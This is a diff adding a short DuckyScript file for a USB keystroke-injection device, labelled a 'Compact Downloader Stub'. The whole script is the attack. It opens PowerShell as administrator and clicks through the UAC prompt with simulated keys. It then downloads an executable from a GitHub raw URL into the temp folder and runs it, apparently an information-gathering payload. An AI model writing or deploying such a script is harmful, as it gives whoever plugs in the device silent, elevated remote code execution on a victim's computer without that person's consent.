@@ -1,0 +1,19 @@
+REM --- Rubber Ducky Script v1.0: Compact Downloader Stub ---
+DEFAULT_DELAY 100
+DELAY 1000
+
+REM Open windows start menu
+GUI
+DELAY 1000
+
+REM search powershell and run as admin
+STRING powershell
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 500
+ALT Y
+DELAY 1000
+
+REM Download raw .exe payload from GitHub and execute
+STRING iwr 'https://raw.githubusercontent.com/stefanlft/badduck_payloads/main/disco_info/dscinf.exe' -OutFile $env:TEMP\dscinf.exe; wscript $env:TEMP\dscinf.exe; exit
+ENTER
